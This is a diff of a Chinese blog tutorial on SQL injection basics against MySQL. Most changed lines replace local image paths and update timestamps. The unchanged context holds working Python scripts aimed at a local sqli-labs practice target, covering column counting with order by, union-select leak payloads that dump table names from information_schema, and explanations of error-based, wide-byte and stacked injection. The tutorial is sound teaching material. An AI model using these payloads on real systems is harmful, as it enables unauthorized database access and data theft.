@@ -25,21 +25,21 @@
 <meta property="og:site_name" content="sky123">
 <meta property="og:description" content="注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。 SQL 注入基础数据库的结构数据库的结构如下图所示：  数据库实例（Database Instance）：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。 数据库（Database）：是有序的数据集合，每个数据库包含多个表。 表（Tabl">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/4994106ae4d0162882eaa2c09b17ed1a.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/d35a58a9e4678a6a7292bb65f15676e3.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/5c709c7349c8f30fec1762fcfebc4d84.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/9294d0debed40b803079f2bdb3dc7208.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/a08a012565526873e3eae271c57b39de.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/1bde5ee9419868283a667851852434fa.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/edbdebdd4b119797c5b6ddc33f4be444.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/183654d7415c8d969b5b186050e17107.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/e7f10d98b1fe54ea39c4b331e85b3823.png">
-<meta property="og:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/9c61499d7d0369820e37ae28aa6ee48a.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/4994106ae4d0162882eaa2c09b17ed1a.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/d35a58a9e4678a6a7292bb65f15676e3.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/5c709c7349c8f30fec1762fcfebc4d84.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9294d0debed40b803079f2bdb3dc7208.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/a08a012565526873e3eae271c57b39de.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/1bde5ee9419868283a667851852434fa.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/edbdebdd4b119797c5b6ddc33f4be444.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/183654d7415c8d969b5b186050e17107.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/e7f10d98b1fe54ea39c4b331e85b3823.png">
+<meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9c61499d7d0369820e37ae28aa6ee48a.png">
 <meta property="article:published_time" content="2024-11-11T15:28:16.865Z">
-<meta property="article:modified_time" content="2024-11-11T16:31:24.252Z">
+<meta property="article:modified_time" content="2024-11-11T16:36:43.236Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/28747/Desktop/1/blog/source/_posts/images/4994106ae4d0162882eaa2c09b17ed1a.png">
+<meta name="twitter:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/4994106ae4d0162882eaa2c09b17ed1a.png">
     
     
     <!--- Icon Part-->
@@ -285,8 +285,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-12 00:31:24</span>
-            <span class="mobile">2024-11-12 00:31:24</span>
+            <span class="desktop">2024-11-12 00:36:43</span>
+            <span class="mobile">2024-11-12 00:36:43</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -325,7 +325,7 @@
 <h1 id="SQL-注入基础"><a href="#SQL-注入基础" class="headerlink" title="SQL 注入基础"></a>SQL 注入基础</h1><h2 id="数据库的结构"><a href="#数据库的结构" class="headerlink" title="数据库的结构"></a>数据库的结构</h2><p>数据库的结构如下图所示：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/4994106ae4d0162882eaa2c09b17ed1a.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/4994106ae4d0162882eaa2c09b17ed1a.png"
                       alt="在这里插入图片描述"
                 ></p>
 <ul>
@@ -611,7 +611,7 @@
 <h3 id="信息泄露过程"><a href="#信息泄露过程" class="headerlink" title="信息泄露过程"></a>信息泄露过程</h3><p>根据 <code>information_schema</code> 数据库中的内容可以有如下查询顺序：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/d35a58a9e4678a6a7292bb65f15676e3.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/d35a58a9e4678a6a7292bb65f15676e3.png"
                       alt="在这里插入图片描述"
                 ></p>
 <ul>
@@ -634,7 +634,7 @@
 <h2 id="判断表中列数"><a href="#判断表中列数" class="headerlink" title="判断表中列数"></a>判断表中列数</h2><p>为了方便后续获取数据，需要先知道<strong>查询的表中显示的字段数</strong>，可以使用 <code>order by &lt;column_num&gt;</code> 来进行判断。当 <code>order by</code> 的数字大于当前的列数时候就会报错，SQL 注入利用这个特性来判断列数。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/5c709c7349c8f30fec1762fcfebc4d84.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/5c709c7349c8f30fec1762fcfebc4d84.png"
                       alt="在这里插入图片描述"
                 ></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-1/&#x27;</span></span><br><span class="line"></span><br><span class="line">column_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    column_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Unknown column&quot;</span> <span class="keyword">in</span> requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; order by <span class="subst">&#123;column_num&#125;</span>%23&quot;</span>).text:</span><br><span class="line">        <span class="built_in">print</span>(requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; order by <span class="subst">&#123;column_num&#125;</span>%23&quot;</span>).text)</span><br><span class="line">        column_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(column_num)</span><br></pre></td></tr></table></figure></div>
@@ -644,7 +644,7 @@
 <p>这里注意最好确保 <code>union</code> 左边查询的内容为空（因为有的网页只显示第一条查询到的结果），这样并上 <code>1,2,...,&lt;column_num&gt;</code> 后结果只有一行，我们只需要观察显示在页面上的结果有哪些数字即可。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/9294d0debed40b803079f2bdb3dc7208.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9294d0debed40b803079f2bdb3dc7208.png"
                       alt="在这里插入图片描述"
                 ></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; union select <span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(_ + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(column_num)])&#125;</span>%23&quot;</span>).text)</span><br></pre></td></tr></table></figure></div>
@@ -652,7 +652,7 @@
 <h2 id="泄露原语"><a href="#泄露原语" class="headerlink" title="泄露原语"></a>泄露原语</h2><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/a08a012565526873e3eae271c57b39de.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/a08a012565526873e3eae271c57b39de.png"
                       alt="在这里插入图片描述"
                 ></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; union select 1,(<span class="subst">&#123;query_data&#125;</span>),3%23&quot;</span>).text</span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">r&#x27;Your Login name:([^&lt;\s]+)&#x27;</span>, html_content).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_data(<span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span>).split(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
@@ -679,7 +679,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/1bde5ee9419868283a667851852434fa.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/1bde5ee9419868283a667851852434fa.png"
                       alt="在这里插入图片描述"
                 ></p>
 <h2 id="判断超时"><a href="#判断超时" class="headerlink" title="判断超时"></a>判断超时</h2><p>时间盲注是以请求时间为判断依据的，这里通过线程执行时间来判断是否超时。</p>
@@ -780,13 +780,13 @@
 <p>根据这一特性我们可以得出结论：<code>floor(rand(12323) * 2)</code> 第一次产生的值不会统计进去而是将下一个产生的值统计进去，然后总共统计表的数据条数个数。因此执行结果如下：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/edbdebdd4b119797c5b6ddc33f4be444.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/edbdebdd4b119797c5b6ddc33f4be444.png"
                       alt="在这里插入图片描述"
                 ><br>然而这里存在一个十分严重的问题，如果再次执行 <code>floor(rand(12323) * 2)</code> 获得一个唯一键 <code>b</code> 与原本的唯一键 <code>a</code> <strong>可能不同</strong>，也就是说插入虚拟表中的唯一键 <code>b</code> 可能在虚拟表中已经存在，这就违反了虚拟表中唯一键唯一的原则，因此可能会产生报错。</p>
 <p>显然触发报错的随机序列的最短长度为 4（形如 <code>ABAB</code> 的序列），也就是说这种方式要求查询一个行数至少为 4 的表格才能确保触发报错。我们将随机种子修改为 14 则结果如下：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/183654d7415c8d969b5b186050e17107.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/183654d7415c8d969b5b186050e17107.png"
                       alt="在这里插入图片描述"
                 ><br>从报错中我们发现重复的唯一键 <code>0</code> 在报错信息中输出出来了，因此我们可以在键中插入我们需要输出的查询结果就可以实现信息泄露。</p>
 <h3 id="泄露原语-2"><a href="#泄露原语-2" class="headerlink" title="泄露原语"></a>泄露原语</h3><ul>
@@ -837,7 +837,7 @@
 <p><strong>但是事实上 php 传入的字符串仍是 utf-8 编码</strong>，因此如果我们在 <code>&#39;</code> 前面放一个 <code>\xdf</code> 字符，那么在 gbk 编码下 <code>\xdf</code> 符号位置位，应当和后面的 <code>\x5c</code> 组成一个汉字「運」，这就使得 <code>\</code> 对 <code>&#39;</code> 的转义失效，从而造成 <code>&#39;</code> 的闭合引发 sql 注入。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/e7f10d98b1fe54ea39c4b331e85b3823.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/e7f10d98b1fe54ea39c4b331e85b3823.png"
                       alt="在这里插入图片描述"
                 ></p>
 <h2 id="泄露原语-3"><a href="#泄露原语-3" class="headerlink" title="泄露原语"></a>泄露原语</h2><p>宽字节注入实际上只是一个闭合技巧，这里我实现了 union 注入的泄露原语。需要注意的是查询语句中不能有能被转义的字符，这里我通过将 <code>&quot;</code> 或 <code>&#39;</code> 包裹的字符串转换成 16 进制的数字来绕过。</p>
@@ -855,7 +855,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/28747/Desktop/1/blog/source/_posts/images/9c61499d7d0369820e37ae28aa6ee48a.png"
+                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9c61499d7d0369820e37ae28aa6ee48a.png"
                       alt="在这里插入图片描述"
                 ></p>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中， 分号（<code>;</code>） 是用来表示一条 sql 语句的结束。堆叠注入就是利用分号分隔语句实现多条 sql 语句的执行。</p>
@@ -931,7 +931,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-12 00:31:24
+                    :</strong> 2024-11-12 00:36:43
             </li>
         
         <li>
@@ -1095,7 +1095,7 @@
                     </span>
                     
                         <span>
-                            347.9k words in total
+                            347.7k words in total
                         </span>
                     
                 </p>
